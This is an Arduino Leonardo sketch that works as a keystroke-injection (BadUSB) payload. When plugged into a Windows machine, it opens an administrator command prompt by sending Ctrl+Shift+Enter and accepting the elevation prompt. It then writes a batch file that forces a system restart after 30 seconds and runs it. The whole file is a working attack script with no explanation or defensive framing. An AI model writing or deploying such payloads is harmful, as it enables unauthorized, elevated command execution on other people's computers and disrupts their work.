#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("copy con Shutdown.bat");
  delay(3000);
  Keyboard.println("@echo off");
  delay(3000);
  Keyboard.println("shutdown /r /t 30");
  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("Shutdown.bat");
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("exit");
  while(1);
}
